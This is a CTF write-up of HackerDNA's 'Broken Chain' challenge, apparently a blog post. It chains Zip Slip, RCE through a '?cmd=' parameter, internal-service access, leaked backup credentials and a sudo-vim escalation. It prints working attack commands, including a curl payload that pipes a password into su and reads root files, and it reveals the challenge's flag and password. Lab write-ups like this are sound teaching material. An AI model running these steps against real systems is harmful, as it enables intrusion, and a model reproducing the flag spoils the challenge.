---
title: "Broken Chain – CTF Writeup"
date: 2026-03-14
categories:
  - Misc
tags:
  - Misc
  - HackerDNA
collections:
  - HackerDNA
---



{{< admonition tldr "TL;DR" >}}

**Broken Chain – CTF Writeup** is a misc challenge from **HackerDNA**. This writeup provides a complete walkthrough and technical analysis.

{{< /admonition >}}

## Overview

The **Broken Chain** challenge demonstrates how multiple small vulnerabilities can be chained together to achieve full system compromise. The exploitation path includes a **Zip Slip vulnerability**, **remote command execution**, interaction with an **internal backup service**, **credential disclosure**, and finally **privilege escalation via a misconfigured sudo rule allowing Vim execution as root**.

This write-up documents the full attack chain that ultimately results in retrieving the root flag.

---

# Initial Foothold – Zip Slip Vulnerability

The target web application allowed users to upload compressed archives. During testing, it was discovered that the extraction process did not properly validate file paths inside the archive.

This made the application vulnerable to **Zip Slip**, which allows attackers to write files outside the intended extraction directory using path traversal sequences such as:

```
../../app.py
```

By crafting a malicious archive, it was possible to overwrite the Flask application's source file ( `app.py` ).

---

# Remote Code Execution

The malicious archive replaced the application logic with a version that allowed command execution through a query parameter.

Commands could then be executed using:

```
http://TARGET:8080/?cmd=<command>
```

Examples:

```
curl "http://TARGET:8080/?cmd=id"
```

This confirmed **Remote Command Execution (RCE)**.

---

# Enumeration System

With command execution available, system enumeration was performed.

One important discovery was an internal service running locally:

```
127.0.0.1:45678
```

Since it was only accessible locally, requests had to be proxied through the existing RCE.

Examples:

```
curl "http://TARGET:8080/?cmd=curl localhost:45678"
```

The service returned a `404` , indicating that further endpoint discovery was required.

---

# Discovering the Backup Control Panel

Further enumeration revealed an internal interface:

```
/controlpanel
```

This page displays a **Backup Control Panel** used for managing backup operations.

Another endpoint was discovered:

```
/backup/login
```

which required an authentication code.

After authenticating, the backup feature allowed posting a **directory path** that the system would back up.

---

# Abusing the Backup Feature

Instead of attempting to access sensitive files directly, the backup functionality was used to archive the **manager user's home directory**.

Submitted path:

```
/home/manager
```

After the backup is completed, the results were accessible through the control panel.

```
/controlpanel/manager
```

This revealed the following structure:

```
manager/
 ├── main.out
 └── vacation/
      ├── HotelCharges_perday.txt
      ├── backup.txt
      └── world_map.png
```

---

# Credential Disclosure

The file `backup.txt` contains several pieces of information including backup codes and voucher codes. More importantly, it also contains the manager account password.

```
My Account Pass:
TnXpF9F2RHs2F6D
```

This credential allowed switching to the **manager** user.

---

# Privilege Enumeration

Using the discovered credentials:

```
su manager
```

Password:

```
TnXpF9F2RHs2F6D
```

Privilege enumeration was then performed.

```
sudo -l
```

Output:

```
User manager may run the following commands:
(ALL) NOPASSWD: /usr/bin/vim
```

This configuration allows the **manager** user to execute Vim as root without entering a password.

---

# Privilege Escalation via Vim

Vim allows command execution and file reading through internal commands.

Using the following payload, Vim was executed as root and used to read the root flag file.

```
curl 'http://TARGET:8080/?cmd=echo%20TnXpF9F2RHs2F6D%20|%20su%20manager%20-c%20"sudo%20vim%20-es%20-c%20\":r%20/root/flag-root.txt\"%20-c%20\":p\"%20-c%20\":qa!\""'
```

Explanation of the Vim commands:

```
:r /root/flag-root.txt   -> reads the flag file
:p                       -> prints the contents
:qa!                     -> exits Vim
```

Because Vim was executed via `sudo` , it ran with **root privileges**, allowing access to `/root/flag-root.txt` .

---

# Root Flags

The command successfully printed the root flag:

```
3c531f2b-e5d2-420d-bc2d-fda53e2810f4
```

---

# Attack Chain Summary

1. Zip Slip vulnerability in archive extraction
2. Overwrite `app.py` 3. Gain Remote Command Execution via `/?cmd=` 4. Discover internal service on `localhost:45678` 5. Access Backup Control Panel
6. Backup `/home/manager` 7. Extract credentials from `backup.txt` 8. Switch to `manager` user
9. Identify `sudo vim` permission
10. Use Vim to read `/root/flag-root.txt` ---

# Key Takeaways

This challenge highlights how chaining multiple vulnerabilities can lead to full system compromise:

* Insecure archive extraction (Zip Slip)
* Remote command execution
* Exposure of internal services
* Sensitive information disclosure in backups
* Dangerous sudo permissions

Even individually minor misconfigurations can become critical when combined.

---

# Final Results

Root access was successfully obtained and the flag retrieved from:

```
/root/flag-root.txt
```

Root Flag:

```
3c531f2b-e5d2-420d-bc2d-fda53e2810f4
```

---

**Author:**
spawntopwn
